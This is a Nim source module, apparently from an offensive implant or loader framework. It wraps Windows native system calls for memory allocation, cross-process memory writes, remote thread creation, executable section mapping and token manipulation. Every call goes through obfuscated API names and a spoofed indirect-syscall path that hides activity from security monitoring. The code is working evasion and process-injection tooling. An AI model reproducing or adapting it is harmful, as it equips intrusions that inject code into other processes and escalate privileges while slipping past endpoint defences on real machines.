import tables
import utils
import ssn
import spoof
import ../global

const currentProcess* = cast[pointer](-1)
const stubMissing* = 0xC0000225'u32
const processVmAll* = 0x001FFFFF'u32
const secCommit* = 0x08000000'u32
const sectionMapRwx* = 0x000E'u32
const viewUnmap* = 2'u32
const threadStackReserve* = 0x200000.csize_t

proc ntCall(
  api: string;
  rcx, rdx, r8, r9: pointer;
  s1: pointer = nil; s2: pointer = nil; s3: pointer = nil; s4: pointer = nil;
  s5: pointer = nil; s6: pointer = nil; s7: pointer = nil; s8: pointer = nil
): culong =
  # Dispatches the named syscall through the spoof path
  if not syscallReady:
    discard prepareSyscalls()
  let ssn = ssns.getOrDefault(api)
  if ssn == 0 or syscallGadget == 0:
    return stubMissing
  spoofSyscall(
    ssn, cast[pointer](syscallGadget), rcx, rdx, r8, r9, s1, s2, s3, s4, s5, s6, s7, s8
  )

proc virtualAlloc*(lp: pointer; size: csize_t; typ, protect: culong; status: ptr culong = nil): pointer =
  # Allocates virtual memory in the current process
  var base = lp
  var region = size
  let st = ntCall(
    obf("NtAllocateVirtualMemory"), currentProcess, addr base, cast[pointer](0), addr region,
    cast[pointer](typ), cast[pointer](protect)
  )
  if status != nil: status[] = st
  if st != 0: nil else: base

proc virtualAllocEx*(procH, lp: pointer; size: csize_t; typ, protect: culong; status: ptr culong = nil): pointer =
  # Allocates virtual memory in the target process
  var base = lp
  var region = size
  let st = ntCall(
    obf("NtAllocateVirtualMemory"), procH, addr base, cast[pointer](0), addr region,
    cast[pointer](typ), cast[pointer](protect)
  )
  if status != nil: status[] = st
  if st != 0: nil else: base

proc openProcess*(pid: culong; access: culong = processVmAll; status: ptr culong = nil): pointer =
  # Opens a process handle for the given process id
  var h: pointer
  var oa = OBJECT_ATTRIBUTES(Length: culong sizeof(OBJECT_ATTRIBUTES))
  var ci = CLIENT_ID(UniqueProcess: cast[pointer](pid), UniqueThread: nil)
  let st = ntCall(obf("NtOpenProcess"), addr h, cast[pointer](access), addr oa, addr ci)
  if status != nil: status[] = st
  if st != 0: nil
  else: h

proc writeVirtualMemory*(procH, base, buf: pointer; size: csize_t): culong =
  # Writes a buffer into the target process memory
  var written: csize_t = 0
  ntCall(obf("NtWriteVirtualMemory"), procH, base, buf, cast[pointer](size), addr written)

proc readVirtualMemory*(procH, base, buf: pointer; size: csize_t): culong =
  # Reads memory from the target process into a buffer
  var nread: csize_t = 0
  ntCall(obf("NtReadVirtualMemory"), procH, base, buf, cast[pointer](size), addr nread)

proc protectVirtualMemory*(procH: pointer; base: ptr pointer; size: ptr csize_t; prot: culong; old: ptr culong): culong =
  # Changes the protection of a memory region
  ntCall(obf("NtProtectVirtualMemory"), procH, cast[pointer](base), cast[pointer](size), cast[pointer](prot), old)

proc createThreadEx*(
  procH, start: pointer; param: pointer = nil; stackSize: csize_t = threadStackReserve
): pointer =
  # Creates a thread in the target process
  var h: pointer
  if ntCall(
    obf("NtCreateThreadEx"), addr h, cast[pointer](processVmAll), nil, procH, start, param,
    cast[pointer](0), cast[pointer](0.csize_t), cast[pointer](stackSize), cast[pointer](0.csize_t), nil
  ) != 0: nil
  else: h

proc createThread*(start, param: pointer): pointer =
  # Creates a thread in the current process
  createThreadEx(currentProcess, start, param)

proc waitForObject*(h: pointer): culong =
  # Waits until the object handle is signaled
  ntCall(obf("NtWaitForSingleObject"), h, cast[pointer](0), nil, nil)

proc ntCreateEvent*(h: ptr pointer; access: culong; oa: pointer; typ, state: culong): culong =
  # Creates an event object
  ntCall(obf("NtCreateEvent"), cast[pointer](h), cast[pointer](access), oa, cast[pointer](typ), cast[pointer](state))

proc ntSetEvent*(ev: pointer; prev: ptr culong = nil): culong =
  # Signals the event object
  ntCall(obf("NtSetEvent"), ev, cast[pointer](prev), nil, nil)

proc ntSetEventStub*(): pointer =
  # Returns the stub pointer for NtSetEvent
  getSsn(obf("NtSetEvent"))

proc ntSignalAndWait*(sig, wait: pointer; alert: culong; timeout: pointer): culong =
  # Signals one object and waits on another
  ntCall(obf("NtSignalAndWaitForSingleObject"), sig, wait, cast[pointer](alert), timeout)

proc ntCloseHandle*(h: pointer): culong =
  # Closes the handle
  if h == nil: return 0
  ntCall(obf("NtClose"), h, nil, nil, nil)

proc freeVirtualMemory*(procH: pointer; base: ptr pointer; typ: culong): culong =
  # Frees virtual memory in the target process
  var region: csize_t = 0
  ntCall(obf("NtFreeVirtualMemory"), procH, cast[pointer](base), addr region, cast[pointer](typ))

proc virtualFree*(lp: pointer; typ: culong): culong =
  # Frees virtual memory in the current process
  var base = lp
  freeVirtualMemory(currentProcess, addr base, typ)

proc virtualProtect*(lp: pointer; sz: culong; prot: culong; old: var culong): culong =
  # Changes protection of memory in the current process
  var base = lp
  var region = csize_t(sz)
  if protectVirtualMemory(currentProcess, addr base, addr region, prot, addr old) != 0: 0
  else: 1

proc terminateProcess*(procH: pointer; status: culong = 0xC0000001'u32): culong =
  # Terminates the process
  ntCall(obf("NtTerminateProcess"), procH, cast[pointer](status), nil, nil)

proc suspendProcess*(procH: pointer): culong =
  # Suspends the process
  ntCall(obf("NtSuspendProcess"), procH, nil, nil, nil)

proc resumeProcess*(procH: pointer): culong =
  # Resumes the process
  ntCall(obf("NtResumeProcess"), procH, nil, nil, nil)

proc readFile*(h, buf: pointer; size: culong): culong =
  # Reads bytes from the file handle
  var iosb: array[16, byte]
  zeroMem(addr iosb[0], iosb.len)
  if ntCall(obf("NtReadFile"), h, nil, nil, nil, addr iosb[0], buf, cast[pointer](size)) != 0: 0
  else: cast[ptr culong](addr iosb[8])[]

proc openProcessToken*(procH: pointer; access: culong; token: ptr pointer): culong =
  # Opens the token of the process
  ntCall(obf("NtOpenProcessToken"), procH, cast[pointer](access), cast[pointer](token), nil)

proc queryInformationToken*(token: pointer; cls: culong; info: pointer; len: culong; retLen: ptr culong): culong =
  # Queries information from the token
  ntCall(obf("NtQueryInformationToken"), token, cast[pointer](cls), info, cast[pointer](len), cast[pointer](retLen))

proc adjustPrivilegesToken*(token: pointer; disableAll: culong; newState: pointer; bufLen: culong; prev: pointer; retLen: ptr culong): culong =
  # Adjusts privileges on the token
  ntCall(
    obf("NtAdjustPrivilegesToken"), token, cast[pointer](disableAll), newState, cast[pointer](bufLen), prev, cast[pointer](retLen)
  )

proc duplicateToken*(existing: pointer; access: culong; oa: pointer; effectiveOnly: culong; tokenType: culong; newToken: ptr pointer): culong =
  # Duplicates the token
  ntCall(
    obf("NtDuplicateToken"), existing, cast[pointer](access), oa, cast[pointer](effectiveOnly), cast[pointer](tokenType), cast[pointer](newToken)
  )

proc queryInformationProcess*(procH: pointer; cls: culong; info: pointer; len: culong; retLen: ptr culong): culong =
  # Queries information from the process
  ntCall(obf("NtQueryInformationProcess"), procH, cast[pointer](cls), info, cast[pointer](len), cast[pointer](retLen))

proc querySystemInformation*(cls: culong; info: pointer; len: culong; retLen: ptr culong): culong =
  # Queries system information
  ntCall(obf("NtQuerySystemInformation"), cast[pointer](cls), info, cast[pointer](len), cast[pointer](retLen))

proc createSection*(hSection: ptr pointer; byteSize: int64; sectionProtect: culong = PAGE_EXECUTE_READWRITE): culong =
  # Creates a section object
  var maxSize = byteSize
  ntCall(
    obf("NtCreateSection"), cast[pointer](hSection), cast[pointer](sectionMapRwx), nil,
    cast[pointer](addr maxSize), cast[pointer](sectionProtect), cast[pointer](secCommit), nil
  )

proc mapViewOfSection*(
  section, procH: pointer; base: ptr pointer; viewSize: ptr csize_t; win32Protect: culong
): culong =
  # Maps a view of the section into the process
  ntCall(
    obf("NtMapViewOfSection"), section, procH, cast[pointer](base), cast[pointer](0), cast[pointer](0),
    nil, cast[pointer](viewSize), cast[pointer](viewUnmap), cast[pointer](0), cast[pointer](win32Protect)
  )

proc unmapViewOfSection*(procH, base: pointer): culong =
  # Unmaps the section view from the process
  ntCall(obf("NtUnmapViewOfSection"), procH, base, nil, nil)
